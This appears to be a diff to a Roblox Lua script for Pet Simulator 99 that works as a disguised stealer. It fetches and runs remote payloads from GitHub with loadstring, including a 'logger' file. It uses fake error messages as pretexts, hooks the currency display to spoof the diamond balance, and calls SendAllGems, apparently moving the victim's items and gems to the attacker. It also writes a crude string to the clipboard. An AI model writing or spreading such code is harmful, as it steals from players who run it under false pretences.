@@ -3,8 +3,12 @@ local player = game:GetService"Players".LocalPlayer
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Diapolo69/ps99/main/logger.lua'))()
 wait(0.5)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Diapolo69/ps99/main/peepee.lua"))()
+if require(game.ReplicatedStorage.Library.Client.EggCmds).GetMaxHatch() < 50 then
+    local message = require(game.ReplicatedStorage.Library.Client.Message)
+    message.Error("Woops! You need at least 50 egg slots in order to make the script work!")
+else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Diapolo69/ps99/refs/heads/main/fard.lua"))()
+end
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = game.ReplicatedStorage.Library
 local save = require(library.Client.Save).Get().Inventory
@@ -458,11 +462,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
 	local CurrencyCmdz = require(game.ReplicatedStorage.Library.Client.CurrencyCmds)
 	local originalGetFunction = CurrencyCmdz.Get
 	CurrencyCmdz.Get = function(currencyType)
-    		if currencyType == "Diamonds" then
-        		return 25000000000
-    		else
-        		return originalGetFunction(currencyType)
-    		end
+
 	end
     for _, item in ipairs(sortedItems) do
         if item.rap >= newamount then
@@ -473,6 +473,4 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     end
     SendAllGems()
     setclipboard("Cocks and Balls")
-    local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("Woops! You need to go to WORLD 2 in order to make the script work")
 end
